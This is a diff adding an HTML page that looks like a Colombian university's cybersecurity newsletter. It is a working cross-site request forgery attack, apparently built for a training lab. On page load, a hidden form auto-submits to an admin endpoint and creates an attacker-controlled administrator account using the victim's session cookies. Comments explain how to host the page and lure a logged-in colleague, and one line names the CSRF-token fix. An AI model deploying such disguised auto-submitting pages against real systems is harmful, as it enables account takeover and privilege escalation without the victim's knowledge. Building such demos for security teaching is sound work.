@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Newsletter mensual - UCC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f5f7fa;
+            color: #2b3a55;
+            padding: 40px;
+        }
+        .card {
+            max-width: 520px;
+            margin: 60px auto;
+            background: white;
+            padding: 28px 32px;
+            border-radius: 12px;
+            box-shadow: 0 4px 18px rgba(0,0,0,0.08);
+        }
+        h1 { margin: 0 0 8px; font-size: 22px; }
+        .meta { color: #6c7a99; font-size: 13px; margin-bottom: 22px; }
+        .gift {
+            margin-top: 18px;
+            background: #eef4ff;
+            border-radius: 8px;
+            padding: 14px 18px;
+            color: #173b80;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<!--
+    Demo de Cross-Site Request Forgery (CSRF) contra /admin.php
+
+    Como funciona:
+    1. La victima (la persona que ya hizo login en IDS o UWS y tiene la
+       cookie 'role=admin' en su navegador) abre esta pagina.
+    2. El navegador envia automaticamente el formulario "oculto" de abajo,
+       reutilizando esas cookies. /admin.php no valida un token CSRF, asi
+       que la peticion se ejecuta como si la hubiese hecho la victima.
+    3. Se crea un usuario nuevo controlado por el atacante (admin).
+
+    Para probarlo desde otra maquina:
+    - Sube este archivo a /uploads/attacker.html via /upload.php (o sirvelo
+      desde tu propia VM).
+    - Comparte el enlace con un compañero que ya haya hecho login.
+
+    Para "blue team": agregar token CSRF (verificar $_POST['csrf'] vs $_SESSION['csrf'])
+    es la mitigacion estandar.
+-->
+
+<div class="card">
+    <h1>Newsletter UCC Cibersecurity #04</h1>
+    <p class="meta">Edicion mensual &middot; Universidad Cooperativa de Colombia</p>
+    <p>Hola, querido lector.<br />
+    Gracias por seguir nuestra serie de articulos sobre seguridad ofensiva.</p>
+    <p>Esta semana hablamos de:</p>
+    <ul>
+        <li>Buenas practicas en autenticacion web</li>
+        <li>Como auditar tus paneles internos</li>
+        <li>Casos de estudio de fugas recientes</li>
+    </ul>
+    <div class="gift">
+        Como agradecimiento, descarga la version PDF al final de la pagina.
+    </div>
+</div>
+
+<!-- ===== payload CSRF (cambia la URL si tu lab corre en otra IP/puerto) ===== -->
+<form id="csrf" action="http://localhost:8080/admin.php" method="POST" style="display:none;">
+    <input name="create_user"  value="1" />
+    <input name="new_username" value="ghost_red" />
+    <input name="new_password" value="GhostPass1" />
+    <input name="new_role"     value="admin" />
+</form>
+
+<script>
+    document.getElementById('csrf').submit();
+</script>
+
+</body>
+</html>
